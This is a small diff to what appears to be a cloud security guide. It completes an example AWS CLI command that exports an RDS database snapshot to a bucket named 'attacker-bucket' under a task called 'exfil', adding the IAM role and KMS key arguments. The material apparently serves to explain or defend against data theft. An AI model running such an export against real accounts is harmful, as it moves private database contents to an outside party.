@@ -196,7 +196,9 @@ aws rds modify-db-instance \\
 aws rds start-export-task \\
   --export-task-identifier exfil \\
   --source-arn arn:aws:rds:REGION:ACCOUNT:snapshot:snap-xxx \\
-  --s3-bucket-name attacker-bucket
+  --s3-bucket-name attacker-bucket \\
+  --iam-role-arn arn:aws:iam::ACCOUNT:role/ExportRole \\
+  --kms-key-id arn:aws:kms:REGION:ACCOUNT:key/xxx
 ```
 
 ## Policy Examples
